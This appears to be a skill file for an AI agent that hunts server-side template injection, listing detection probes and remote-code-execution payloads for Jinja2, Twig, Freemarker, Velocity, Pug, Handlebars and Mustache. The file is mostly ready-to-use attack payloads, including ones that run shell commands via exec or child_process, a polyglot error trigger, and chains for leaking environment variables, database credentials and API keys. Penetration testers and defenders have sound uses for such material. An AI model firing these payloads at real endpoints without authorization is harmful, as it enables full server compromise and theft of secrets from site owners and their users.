---
name: hunt-ssti
description: "Hunting skill for Server-Side Template Injection (SSTI) vulnerabilities. Detection per template engine (Jinja2, Twig, Freemarker, Velocity, Jade/Pug, Handlebars, Mustache), RCE escalation, sandbox escape. Use when testing endpoints that render user-controlled templates or template references."
---

# Hunt: SSTI (Server-Side Template Injection)

## Detection by Engine

### Jinja2 (Python/Flask)
```
{{7*7}} → 49
{{config}} → Flask config dictionary
{{''.__class__.__mro__[2].__subclasses__()}} → all classes
→ RCE via found os module
```

### Twig (PHP)
```
{{7*7}} → 49
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```
${7*7} → 49
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toExternalForm()}
```

### Velocity (Java)
```
#set($x=7*7) $x → 49
$class.inspect("java.lang.Runtime").getRuntime().exec("id")
```

### Jade/Pug (Node.js)
```
#{7*7} → 49
- var x = require('child_process').execSync('id')
```

### Handlebars (Node.js)
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.split "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Mustache (Node.js, limited)
```
{{constructor.constructor('return process')().env}}
```

## Detection Method
```
${{<%[%'"}}%\.   → Error: template engine error dumped
a{{7*99}}b        → Response: a693b (if template engine evaluates)
```
Use the universal polyglot payload to trigger errors, then identify engine.

## Confirmation Gates
- `{{7*7}}` returns 49 → confirmed (SSTI present)
- Command execution (`id`, `whoami`) → confirmed + critical
- File read via template engine → confirmed + high

## Chain Templates
- SSTI + RCE → full server compromise
- SSTI + Information Disclosure → leaked env vars, DB creds, API keys
- SSTI + SSRF → use compromised server to access internal endpoints
